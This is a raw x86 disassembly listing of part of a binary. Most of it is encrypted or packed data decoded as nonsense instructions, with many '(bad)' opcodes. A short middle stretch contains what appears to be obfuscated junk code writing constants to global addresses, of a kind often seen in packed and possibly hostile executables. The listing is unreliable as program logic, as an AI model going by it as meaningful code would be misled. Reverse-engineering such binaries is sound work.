  4137ff:	call   0x8b60e9cd
  413804:	mov    esi,0x9c065382
  413809:	dec    edi
  41380a:	(bad)  
  41380d:	adc    eax,0x377accfc
  413812:	(bad)  
  413814:	fcmove st,st(6)
  413816:	ficom  WORD PTR [ebx+0x19]
  413819:	sub    edx,DWORD PTR [ebp+0x57]
  41381c:	or     BYTE PTR [eax*8-0x714fb755],bl
  413823:	(bad)  [eax+0x3c]
  413826:	or     bl,BYTE PTR [edx-0x3134f1e3]
  41382c:	mov    cl,0xaf
  41382e:	cli    
  41382f:	out    0xad,eax
  413831:	pop    ss
  413832:	sub    BYTE PTR [esi],bh
  413834:	(bad)  
  413835:	rcr    bl,1
  413837:	sti    
  413838:	cmp    eax,0xe298e55a
  41383d:	jg     0x4137e5
  41383f:	pop    esp
  413840:	nop
  413841:	adc    ah,ah
  413843:	(bad)  
  413844:	mov    cs,WORD PTR [esi+0x6bc21579]
  41384a:	sahf   
  41384b:	inc    esp
  41384c:	out    0x38,eax
  41384e:	dec    ebp
  41384f:	retf   
  413850:	sbb    al,0xfd
  413852:	adc    al,0x40
  413854:	stos   DWORD PTR es:[edi],eax
  413855:	ja     0x4138c2
  413857:	pop    ebx
  413858:	inc    esi
  413859:	repnz div DWORD PTR [edx-0x52]
  41385d:	mov    ah,0x54
  41385f:	les    ebp,FWORD PTR ds:0xd3778af5
  413865:	test   eax,0x21fa04e3
  41386a:	mov    DWORD PTR [ebp+0x64ec5745],ebx
  413870:	jno    0x413841
  413872:	push   eax
  413873:	push   0x1c27f94c
  413878:	clc    
  413879:	inc    edx
  41387a:	jl     0x4138e7
  41387c:	add    ebp,DWORD PTR [edi+0x4d]
  41387f:	jne    0x413822
  413881:	or     DWORD PTR [eax],edi
  413883:	ret    
  413884:	or     DWORD PTR [eax],0x6a1224ee
  41388a:	imul   edi,DWORD PTR gs:[ebx-0x7e6901dc],0x46383fdf
  413895:	mov    ecx,0xf3caac6b
  41389a:	push   0xffffffe2
  41389c:	push   0x523f308
  4138a1:	out    dx,al
  4138a2:	mov    al,0x2a
  4138a4:	mov    BYTE PTR [edx],ah
  4138a6:	in     al,0xe5
  4138a8:	sub    esp,edi
  4138aa:	ins    BYTE PTR es:[edi],dx
  4138ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138ac:	imul   ecx,DWORD PTR [esi+eax*8-0x17],0xfffffff4
  4138b1:	ficomp DWORD PTR [ecx]
  4138b3:	jne    0x41391b
  4138b5:	ins    DWORD PTR es:[edi],dx
  4138b6:	sti    
  4138b7:	push   esp
  4138b8:	mov    bh,0x21
  4138ba:	dec    ecx
  4138bb:	(bad)  
  4138bc:	fnstcw WORD PTR [edx]
  4138be:	ins    BYTE PTR es:[edi],dx
  4138bf:	or     al,0x5b
  4138c1:	sahf   
  4138c2:	cmp    edx,ecx
  4138c4:	test   eax,0x98abf057
  4138c9:	jne    0x413945
  4138cb:	jnp    0x4138cc
  4138cd:	fist   DWORD PTR [ecx-0x7]
  4138d0:	or     edi,DWORD PTR [ebx-0x4e]
  4138d3:	fmul   QWORD PTR [ecx]
  4138d5:	popa   
  4138d6:	push   ds
  4138d7:	into   
  4138d8:	sbb    eax,0xf84e9daa
  4138dd:	scas   eax,DWORD PTR es:[edi]
  4138de:	cmp    al,0x41
  4138e0:	lock sti 
  4138e2:	mov    al,BYTE PTR [esi]
  4138e4:	adc    ah,bl
  4138e6:	add    eax,0xa8c769e2
  4138eb:	xor    eax,esi
  4138ed:	pop    ds
  4138ee:	loop   0x4138de
  4138f0:	iret   
  4138f1:	xchg   DWORD PTR [ebp+0x3e],edx
  4138f4:	jnp    0x413958
  4138f6:	push   edi
  4138f7:	cmp    esi,DWORD PTR [eax-0x64]
  4138fa:	pop    DWORD PTR [edx]
  4138fc:	loopne 0x41392f
  4138fe:	push   edi
  4138ff:	dec    esi
  413900:	call   0x4994:0xe88f83fe
  413907:	shr    DWORD PTR [edx-0x39],0xfe
  41390b:	mov    ch,0x6d
  41390d:	scas   eax,DWORD PTR es:[edi]
  41390e:	je     0x4138bb
  413910:	es pop ebp
  413912:	jmp    0xcee:0xb162c61
  413919:	stos   BYTE PTR es:[edi],al
  41391a:	jo     0x413937
  41391c:	cmp    eax,0x13e71a87
  413921:	sub    BYTE PTR [ebx+0x27],dl
  413924:	jae    0x41398b
  413926:	mov    ecx,0xd32dd24e
  41392b:	mov    ds:0x6ada8558,al
  413930:	fst    QWORD PTR [edx]
  413932:	outs   dx,BYTE PTR ds:[esi]
  413933:	lods   eax,DWORD PTR ds:[esi]
  413934:	fcom   st(4)
  413936:	inc    ebp
  413937:	out    dx,eax
  413938:	push   eax
  413939:	mov    dh,0x6e
  41393c:	jb     0x413949
  41393e:	add    eax,0x2db2158
  413943:	dec    edi
  413944:	mov    WORD PTR [ecx+edx*2+0x62050f42],?
  41394b:	stos   BYTE PTR es:[edi],al
  41394c:	je     0x413913
  41394e:	add    eax,0xca41e069
  413953:	in     al,0x6a
  413955:	xchg   edi,eax
  413956:	das    
  413957:	mov    bl,0x9f
  413959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41395a:	mov    bh,0xe3
  41395c:	dec    edi
  41395d:	inc    eax
  41395e:	mov    edx,0xadb3d734
  413963:	or     eax,0xfb8a2b34
  413968:	retf   
  413969:	clc    
  41396a:	je     0x4139c3
  41396c:	pop    ss
  41396d:	mov    ds:0x30952e38,al
  413972:	and    BYTE PTR ds:0xa641c104,0xa
  413979:	std    
  41397a:	dec    esi
  41397b:	adc    BYTE PTR [esi+0x5398c901],bl
  413981:	data16 jecxz 0x4139b8
  413984:	mov    ch,0x1a
  413986:	inc    esp
  413987:	cmovo  edi,DWORD PTR [edx+eax*8]
  41398b:	fdivr  st(1),st
  41398d:	mov    al,0xaa
  41398f:	pop    eax
  413990:	xor    eax,0x7d20e85e
  413995:	iret   
  413996:	jge    0x41394f
  413998:	cmp    al,BYTE PTR [ebp-0x20]
  41399b:	cwde   
  41399c:	or     eax,ecx
  41399e:	(bad)  
  41399f:	call   0xe9ad:0x1a69f30b
  4139a6:	and    eax,0x549bda77
  4139ab:	mov    ds:0x5e7cdb93,eax
  4139b0:	shl    BYTE PTR [ecx+0x1a],cl
  4139b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139b4:	add    al,0xe9
  4139b6:	and    eax,0x5deb1f0b
  4139bb:	cli    
  4139bc:	or     BYTE PTR [ecx+edx*1+0x77],ch
  4139c0:	mov    bl,bh
  4139c2:	and    eax,0xf3013bdd
  4139c7:	xchg   ecx,eax
  4139c8:	lahf   
  4139c9:	jmp    0x66e3:0x19696d27
  4139d0:	lahf   
  4139d1:	push   esi
  4139d2:	popa   
  4139d3:	mov    ch,0xc8
  4139d5:	popf   
  4139d6:	sub    dh,BYTE PTR [ebx]
  4139d8:	mov    eax,0x93d8a8f8
  4139dd:	mul    BYTE PTR [eax+0x4d474767]
  4139e3:	mov    ch,0x3d
  4139e5:	pop    esi
  4139e6:	mov    dl,ch
  4139e8:	xchg   esp,eax
  4139e9:	test   al,0x40
  4139eb:	ins    BYTE PTR es:[edi],dx
  4139ec:	adc    BYTE PTR [ebx-0x3],al
  4139ef:	sub    al,0x29
  4139f1:	push   esp
  4139f2:	int    0xf5
  4139f4:	mov    DWORD PTR [ebx],esp
  4139f6:	pop    edx
  4139f7:	out    dx,eax
  4139f8:	push   ds
  4139f9:	mov    edx,DWORD PTR [ecx]
  4139fb:	mov    esp,0x12f21269
  413a00:	and    DWORD PTR [eax+0x67c0c99b],ecx
  413a06:	add    DWORD PTR [esi+0x17],0xfffffffb
  413a0a:	mov    DWORD PTR [edx+0x7d1be48a],ecx
  413a10:	stos   BYTE PTR es:[edi],al
  413a11:	jnp    0x413a07
  413a13:	lea    esp,[ebp-0x19]
  413a16:	daa    
  413a17:	cwde   
  413a18:	xchg   edi,eax
  413a19:	shl    BYTE PTR [eax],cl
  413a1b:	sbb    eax,0x7575efb1
  413a20:	fs fcmovnu st,st(1)
  413a23:	xor    esp,DWORD PTR ds:[eax+edi*1-0xaf3a1fd]
  413a2b:	enter  0xf431,0x94
  413a2f:	push   ds
  413a30:	lahf   
  413a31:	(bad)  
  413a32:	fadd   DWORD PTR [ecx+0x25]
  413a35:	fldcw  WORD PTR [esi-0x218580c5]
  413a3b:	and    DWORD PTR ds:0x465a3382,eax
  413a41:	mov    ch,0x1e
  413a43:	xor    ebx,DWORD PTR [esi]
  413a45:	jns    0x413aa2
  413a47:	dec    ebp
  413a48:	cmp    BYTE PTR [edi+eax*4+0x6917447b],bl
  413a4f:	rol    BYTE PTR ds:0xffbd77e8,cl
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	mov    bh,0x52
  413a69:	mov    ds:0x70687e67,al
  413a6e:	jo     0x413a29
  413a70:	jle    0x413ae2
  413a72:	jo     0x413a37
  413a74:	sbb    bl,BYTE PTR [edi-0x3e957a1a]
  413a7a:	jg     0x413a68
  413a7c:	scas   eax,DWORD PTR es:[edi]
  413a7d:	adc    ebp,DWORD PTR [eax]
  413a7f:	ror    edi,cl
  413a81:	pusha  
  413a82:	cmp    al,0x61
  413a84:	sbb    al,0xf
  413a86:	into   
  413a87:	add    eax,0x2f0c0bf7
  413a8c:	jp     0x413a20
  413a8e:	push   ds
  413a8f:	outs   dx,DWORD PTR ds:[esi]
  413a90:	push   ebx
  413a91:	xchg   DWORD PTR [edi],ecx
  413a93:	sub    al,0x27
  413a95:	dec    edx
  413a96:	test   eax,0x33ceacb9
  413a9b:	add    al,0x73
  413a9d:	int3   
  413a9e:	dec    ecx
  413a9f:	mov    DWORD PTR [edx],0xc4317666
  413aa5:	(bad)  
  413aa6:	push   ss
  413aa7:	mov    bh,0xf1
  413aa9:	pop    ebx
  413aaa:	mov    al,ds:0x538c0b8b
  413aaf:	or     edi,DWORD PTR [ebx]
  413ab1:	(bad)  
  413ab3:	ja     0x413b06
  413ab5:	ja     0x413ab6
  413ab7:	sbb    DWORD PTR ds:0x38d2826a,ebp
  413abd:	mov    ch,dh
  413abf:	mov    bh,0x80
  413ac1:	inc    edi
  413ac2:	ret    
  413ac3:	jecxz  0x413a6b
  413ac5:	adc    eax,0x91bdcca3
  413aca:	cmp    BYTE PTR [edx-0x44d2ae18],dh
  413ad0:	cmc    
  413ad1:	mov    ecx,0x618c66c9
  413ad6:	(bad)  es:[ebp+0x77]
  413ada:	ret    
  413adb:	adc    DWORD PTR ds:0x57c8016b,esi
  413ae1:	pop    edx
  413ae2:	inc    eax
  413ae3:	lods   eax,DWORD PTR ds:[esi]
  413ae4:	sbb    ch,dh
  413ae6:	mov    ss,ebx
  413ae8:	(bad)  
  413ae9:	idiv   BYTE PTR [edx-0x80]
  413aec:	xchg   esi,eax
  413aed:	arpl   WORD PTR [eax-0x74ebdc20],di
  413af3:	hlt    
  413af4:	int    0xc3
  413af6:	xchg   esp,eax
  413af7:	jl     0x413b50
  413af9:	push   ebx
  413afa:	inc    eax
  413afb:	fadd   DWORD PTR [edx+0x65]
  413afe:	fmul   st,st(1)
  413b00:	mov    esp,0x983e838c
  413b05:	xchg   esp,eax
  413b06:	pop    ds
  413b07:	jne    0x413b6b
  413b09:	scas   eax,DWORD PTR es:[edi]
  413b0a:	sbb    al,0xf5
  413b0c:	adc    cl,ch
  413b0e:	in     al,0x65
  413b10:	leave  
  413b11:	pop    ecx
  413b12:	outs   dx,DWORD PTR ds:[esi]
  413b13:	out    dx,eax
  413b14:	pop    ss
  413b15:	(bad)  
  413b16:	xlat   BYTE PTR ds:[ebx]
  413b17:	cdq    
  413b18:	add    ebp,DWORD PTR [eax+eax*2-0x6f]
  413b1c:	xor    al,0xbb
  413b1e:	dec    edi
  413b1f:	mov    ebp,0x2ba9a14
  413b24:	repnz inc eax
  413b26:	adc    eax,0x843fbddb
  413b2b:	repnz (bad) 
  413b2d:	ret    0x602b
  413b30:	loop   0x413acf
  413b32:	mov    dl,0xfb
  413b34:	pop    ss
  413b35:	add    DWORD PTR [ecx+0x5a],eax
  413b38:	jo     0x413af9
  413b3a:	ds mov dl,0xa
  413b3d:	stos   BYTE PTR es:[edi],al
  413b3e:	jo     0x413bbd
  413b40:	popa   
  413b41:	cs or  eax,0x927b50a1
  413b47:	pop    ecx
  413b48:	jg     0x413b94
  413b4a:	icebp  
  413b4b:	mov    ss,esp
  413b4d:	inc    ebx
  413b4e:	push   es
  413b4f:	xor    ecx,DWORD PTR [edx+0x6d]
  413b52:	add    eax,0x814689c6
  413b57:	sub    eax,0xb165e400
  413b5c:	mov    ebp,0x7fb17d8b
  413b61:	pushf  
  413b62:	xor    al,0xda
  413b64:	mov    eax,ds:0xc71d6b59
  413b69:	mov    ss,WORD PTR [edx-0x4fdbad63]
  413b6f:	mov    al,ds:0x9d42b86
  413b74:	scas   al,BYTE PTR es:[edi]
  413b75:	cli    
  413b76:	mov    ebp,0x4c320ef2
  413b7b:	leave  
  413b7c:	icebp  
  413b7d:	shl    DWORD PTR [ebx],cl
  413b7f:	jmp    0x1a0606fd
  413b84:	in     eax,dx
  413b85:	popa   
  413b86:	ret    
  413b87:	and    al,0x4f
  413b89:	and    cl,cl
  413b8b:	mov    bh,0xce
  413b8d:	test   ebx,edi
  413b8f:	stc    
  413b90:	ret    0xf62
  413b93:	sbb    dl,BYTE PTR [esi-0x9]
  413b96:	mov    cl,bh
  413b98:	jg     0x413b89
  413b9a:	mov    ch,0xb2
  413b9c:	xchg   DWORD PTR ds:0x80cd9f92,ecx
  413ba2:	addr16 mov edi,0xb64052a5
  413ba8:	jnp    0x413bfd
  413baa:	lds    eax,FWORD PTR [ebx-0x824dd08]
  413bb0:	sub    dh,al
  413bb2:	dec    esp
  413bb3:	sar    BYTE PTR [edx],cl
  413bb5:	xchg   BYTE PTR [ebx-0x311f0c87],ch
  413bbb:	sub    ebp,ebx
  413bbd:	push   eax
  413bbe:	push   ecx
  413bbf:	jns    0x413bd1
  413bc1:	pop    ebx
  413bc2:	lahf   
  413bc3:	inc    esi
  413bc4:	imul   edi,esp,0xe60764e4
  413bca:	add    ebp,ebp
  413bcc:	loop   0x413b68
  413bce:	pop    esp
  413bcf:	inc    edi
  413bd0:	xchg   ebx,eax
  413bd1:	aam    0xcf
  413bd3:	mov    fs,WORD PTR [esi+0x29]
  413bd6:	mov    ds:0x9d3b94f9,eax
  413bdb:	mov    ebx,0xc56b97a0
  413be0:	lock rcr DWORD PTR [eax+ebp*8],1
  413be4:	mov    esi,0xc8104aa9
  413be9:	out    dx,al
  413bea:	xor    DWORD PTR [ecx+0x52],ebx
  413bed:	out    0x52,eax
  413bef:	jp     0x413c34
  413bf1:	lds    esi,FWORD PTR [esi-0x7a]
  413bf4:	xchg   DWORD PTR [edi],edx
  413bf6:	dec    esp
  413bf7:	lds    edx,FWORD PTR [edx-0x33]
  413bfa:	mov    ch,0xe2
  413bfc:	mov    esp,0xb9fe1e8d
  413c01:	les    edx,FWORD PTR [ebp-0x3f]
  413c04:	std    
  413c05:	test   DWORD PTR [eax],0x1bb6ace7
  413c0b:	leave  
  413c0c:	xchg   edx,eax
  413c0d:	sbb    BYTE PTR ss:[edi],0x7d
  413c11:	or     DWORD PTR [ecx],eax
  413c13:	fstp   DWORD PTR [edx-0x37713bc2]
  413c19:	shl    bl,0x3a
  413c1c:	sub    ecx,DWORD PTR [ecx]
  413c1e:	and    edx,ebx
  413c20:	mov    ds:0x4aca26d0,al
  413c25:	xchg   ecx,edi
  413c27:	adc    BYTE PTR [edi-0xc8386e0],bl
  413c2d:	ss mov ah,0x27
  413c30:	int    0xd7
  413c32:	in     eax,dx
  413c33:	cld    
  413c34:	jb     0x413c2f
  413c36:	xchg   BYTE PTR ds:0xa930b82e,cl
  413c3c:	cdq    
  413c3d:	mov    dh,0x97
  413c3f:	leave  
  413c40:	int    0x79
  413c42:	cdq    
  413c43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c44:	jno    0x413c57
  413c46:	cwde   
  413c47:	pushf  
  413c48:	repz or eax,0x93c484b6
  413c4e:	push   ss
  413c4f:	xchg   ebp,eax
  413c50:	cmp    BYTE PTR [edi+ebx*1+0x18],ah
  413c54:	fidiv  WORD PTR [edi+0x57]
  413c57:	in     eax,0x2f
  413c59:	jbe    0x413c2d
  413c5b:	leave  
  413c5c:	push   0xdac0dc6e
  413c61:	xor    cl,BYTE PTR [esi+0x36]
  413c64:	ret    
  413c65:	retf   
  413c66:	lods   al,BYTE PTR ds:[esi]
  413c67:	xchg   DWORD PTR [edi],esi
  413c69:	stos   DWORD PTR es:[edi],eax
  413c6a:	push   ecx
  413c6b:	mov    ebp,0x97920a04
  413c70:	sub    BYTE PTR [ecx],al
  413c72:	push   0x67
  413c74:	clc    
  413c75:	dec    ebx
  413c76:	addr16 and al,0x22
  413c79:	sbb    DWORD PTR [edi],edx
  413c7b:	mov    dl,0xa1
  413c7d:	mov    dh,0x88
  413c7f:	xor    ecx,DWORD PTR [edx+edx*8+0x9d54bf1]
  413c86:	pushf  
  413c87:	enter  0x89fe,0x7e
  413c8b:	or     eax,0x816db1cf
  413c90:	pop    ecx
  413c91:	call   0xb356f7a0
  413c96:	inc    eax
  413c97:	and    DWORD PTR ds:0x336ceab8,0xffffffa5
  413c9e:	scas   eax,DWORD PTR es:[edi]
  413c9f:	rcr    BYTE PTR [ebp+ebx*4+0x572a65ec],0x3
  413ca7:	pop    esp
  413ca8:	pop    esi
  413ca9:	scas   eax,DWORD PTR es:[edi]
  413caa:	push   ebx
  413cab:	sbb    esi,DWORD PTR [ecx-0x721f4408]
  413cb1:	sub    ah,al
  413cb3:	pop    ecx
  413cb4:	fmulp  st(7),st
  413cb6:	and    al,0x1b
  413cb8:	sub    eax,0x1077ae38
  413cbd:	and    BYTE PTR [edx-0x3f],0x6
  413cc1:	ins    BYTE PTR es:[edi],dx
  413cc2:	stos   BYTE PTR es:[edi],al
  413cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cc4:	adc    esi,ebp
  413cc6:	sbb    eax,0xc2047410
  413ccb:	mov    al,0x6a
  413ccd:	stc    
  413cce:	add    bh,BYTE PTR [edi-0x69]
  413cd1:	ins    DWORD PTR es:[edi],dx
  413cd2:	and    al,0xff
  413cd4:	cmp    ebp,ecx
  413cd6:	jbe    0x413cfb
  413cd8:	jns    0x413d20
  413cda:	iret   
  413cdb:	or     al,0xb
  413cdd:	fwait
  413cde:	ins    BYTE PTR es:[edi],dx
  413cdf:	mov    esi,0x4ce6c7a7
  413ce4:	push   edx
  413ce5:	dec    esp
  413ce6:	cmp    DWORD PTR gs:[eax],esp
  413ce9:	fst    DWORD PTR [eax]
  413ceb:	xchg   DWORD PTR [ecx],ebp
  413ced:	sbb    esi,DWORD PTR [eax-0x13]
  413cf0:	mov    ah,0x5e
  413cf2:	cmp    cl,ah
  413cf4:	and    DWORD PTR [ecx+edi*2-0x7967b7f6],0xffffffbe
  413cfc:	jns    0x413ce6
  413cfe:	jp     0x413c80
  413d00:	lods   eax,DWORD PTR ds:[esi]
  413d01:	das    
  413d02:	cmp    BYTE PTR [eax+0x45],bl
  413d05:	out    dx,al
  413d06:	iret   
  413d07:	dec    ebp
  413d08:	push   ecx
  413d09:	xor    eax,0x131d39d3
  413d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d0f:	bound  esi,QWORD PTR [edi]
  413d11:	jbe    0x413ceb
  413d13:	adc    esi,DWORD PTR [eax+0xf6216d9]
  413d19:	or     edx,DWORD PTR [edi+0x2f2ef7ef]
  413d1f:	mov    ds:0x4edf67c9,al
  413d24:	lds    edi,FWORD PTR [eax]
  413d26:	ins    DWORD PTR es:[edi],dx
  413d27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d28:	or     esi,ebx
  413d2a:	into   
  413d2b:	jmp    0xfd0e:0x32b24d0f
  413d32:	call   0x559df617
  413d37:	stos   BYTE PTR es:[edi],al
  413d38:	not    BYTE PTR [ecx-0x741fba77]
  413d3e:	inc    ebp
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e7ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e7ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e7ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e66b
  413d7f:	cmp    DWORD PTR ds:0x42e7ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e7ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e7ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e7ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e7ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e80f,0x42fe86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e22c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e7f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fdd9,0x42e220
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e7fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e7fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e7fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e7fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e7fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e58b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fe01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e7f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fe8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e803
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e21c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e7fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)
  413e8e:	mov    al,BYTE PTR [edi+0x76]
  413e91:	jo     0x413f03
  413e93:	mov    ecx,0x1770707e
  413e98:	mov    dl,0xef
  413e9a:	in     al,dx
  413e9b:	mov    ah,0xc5
  413e9d:	jae    0x413e7f
  413e9f:	xchg   ebx,eax
  413ea0:	push   ebx
  413ea1:	mov    al,ds:0x9f37a85
  413ea6:	push   ebp
  413ea7:	adc    bh,al
  413ea9:	xor    dl,BYTE PTR [edx+0x18]
  413eac:	mov    BYTE PTR [ebx],ah
  413eae:	xor    DWORD PTR [edx+0x6f514b5f],edx
  413eb4:	mov    cl,0x8c
  413eb6:	ror    BYTE PTR [ecx+0x2da78def],cl
  413ebc:	call   0x4a28:0x40f1bdfd
  413ec3:	dec    esi
  413ec4:	scas   al,BYTE PTR es:[edi]
  413ec5:	lahf   
  413ec6:	add    ecx,DWORD PTR [edi]
  413ec8:	inc    ecx
  413ec9:	pushf  
  413eca:	ret    0x85fb
  413ecd:	js     0x413eb7
  413ecf:	ret    0x832
  413ed2:	pop    eax
  413ed3:	in     al,0xbe
  413ed5:	stos   BYTE PTR es:[edi],al
  413ed6:	mov    ds:0xd6a65d3a,eax
  413edb:	(bad)  
  413edc:	data16 cmp BYTE PTR [edx],dh
  413edf:	(bad)  
  413ee0:	rcr    BYTE PTR [eax-0x71],cl
  413ee3:	sub    eax,ecx
  413ee5:	test   edi,esp
  413ee7:	mov    al,ds:0x773309ea
  413eec:	loop   0x413ee6
  413eee:	mov    edi,esi
  413ef0:	dec    edi
  413ef1:	or     ebx,DWORD PTR [edi]
  413ef3:	repz push 0x45cf5a83
  413ef9:	in     eax,dx
  413efa:	(bad)  
  413efb:	mov    ds:0x8ad0cb2,al
  413f00:	push   cs
  413f01:	mov    ah,0x3d
  413f03:	jp     0x413e98
  413f05:	fnsave [eax]
  413f07:	das    
  413f08:	mov    edx,0xf5fa4863
  413f0d:	add    DWORD PTR [ebp+0x2cc30d8e],0x2a280854
  413f17:	pop    esp
  413f18:	ss sbb eax,0xbd638b27
  413f1e:	or     eax,0x128514f6
  413f23:	sbb    BYTE PTR [ebp+0x630f8e91],0xc5
  413f2a:	sbb    al,0x98
  413f2c:	jne    0x413f7c
  413f2e:	cmp    eax,0x3bc0478e
  413f33:	ins    DWORD PTR es:[edi],dx
  413f34:	outs   dx,BYTE PTR ds:[esi]
  413f35:	mov    dl,0x6d
  413f37:	outs   dx,BYTE PTR ds:[esi]
  413f38:	loopne 0x413f08
  413f3a:	sub    eax,DWORD PTR [ebx+0x3caf4ced]
  413f40:	les    edx,FWORD PTR [esi-0x35]
  413f43:	aas    
  413f44:	pop    ds
  413f45:	jg     0x413f7a
  413f47:	addr16 add al,0x85
  413f4a:	imul   esp,edx,0xffffff91
  413f4d:	xor    edi,DWORD PTR [esi-0xcc5ec27]
  413f53:	ins    DWORD PTR es:[edi],dx
  413f54:	or     eax,0x9a006867
  413f59:	ins    BYTE PTR es:[edi],dx
  413f5a:	sbb    ebx,esp
  413f5c:	xor    DWORD PTR [eax+0x20ee52b4],edx
  413f62:	add    DWORD PTR [edx-0x2a61e1fa],esi
  413f68:	mov    dl,0x5f
  413f6a:	xchg   edx,eax
  413f6b:	(bad)  
  413f6c:	test   eax,0xbc410923
  413f71:	cmp    eax,0xf2bb4067
  413f76:	fwait
  413f77:	xor    ebp,0x475c5f10
  413f7d:	inc    ebp
  413f7e:	xchg   DWORD PTR [eax+0x54],eax
  413f81:	cld    
  413f82:	jl     0x413fb7
  413f84:	pop    ebp
  413f85:	jge    0x413f49
  413f87:	in     eax,dx
  413f88:	daa    
  413f89:	daa    
  413f8a:	cmp    eax,0x99472a5b
  413f8f:	lock and ebx,DWORD PTR [eax-0x2082b930]
  413f96:	mov    ebp,cs
  413f98:	push   0x2a7f3409
  413f9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f9e:	adc    DWORD PTR [ebx-0x561a4dc2],ecx
  413fa4:	sbb    bl,0xd8
  413fa7:	jg     0x413ffb
  413fa9:	dec    esi
  413faa:	popa   
  413fab:	out    0x7,eax
  413fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fae:	sub    BYTE PTR [ecx+0x41],0x7
  413fb2:	xlat   BYTE PTR ds:[ebx]
  413fb3:	sbb    edi,DWORD PTR ds:0x54bf75fa
  413fb9:	ss push 0xb4a437c2
  413fbf:	jmp    0xf1f53114
  413fc4:	sahf   
  413fc5:	in     al,0x79
  413fc7:	or     BYTE PTR [ecx],0x58
  413fca:	fdivr  st(4),st
  413fcc:	call   0x3dbd:0xb6839409
  413fd3:	sub    ah,BYTE PTR [edx-0x142b8c05]
  413fd9:	out    0x29,eax
  413fdb:	lods   al,BYTE PTR ds:[esi]
  413fdc:	add    DWORD PTR [esi+ebp*4-0x32],ebp
  413fe0:	jno    0x414059
  413fe2:	pop    esi
  413fe3:	sub    al,0x28
  413fe5:	idiv   DWORD PTR [esi+esi*2]
  413fe8:	or     dl,bh
  413fea:	call   0xebf7bdc0
  413fef:	sbb    cl,dl
  413ff1:	int3   
  413ff2:	sbb    al,0x7b
  413ff4:	pop    ebx
  413ff5:	shl    DWORD PTR [esi],1
  413ff7:	mov    BYTE PTR [esi+0x2],0x71
  413ffb:	or     DWORD PTR [ebx],esi
  413ffd:	jae    0x413ff2
  413fff:	leave  
  414000:	push   eax
  414001:	aas    
  414002:	jae    0x413fb5
  414004:	leave  
  414005:	sahf   
  414006:	or     ebp,DWORD PTR [ebx+0x40453477]
  41400c:	iret   
  41400d:	ins    BYTE PTR es:[edi],dx
  41400e:	shl    DWORD PTR [esi],cl
  414010:	daa    
  414011:	enter  0x994,0x8e
  414015:	mov    esi,DWORD PTR [ebx]
  414017:	sbb    ecx,DWORD PTR [ecx-0x1b8b3dd0]
  41401d:	int3   
  41401e:	les    edi,FWORD PTR [ebp+ebx*2-0x72]
  414022:	jno    0x414011
  414024:	imul   ebp,eax,0xffffffc5
  414027:	(bad)  
  414028:	push   ebx
  414029:	test   eax,0x162a1552
  41402e:	lods   al,BYTE PTR ds:[esi]
  41402f:	ds dec eax
  414031:	pop    ebp
  414032:	mov    ebp,0x1c459593
  414037:	pusha  
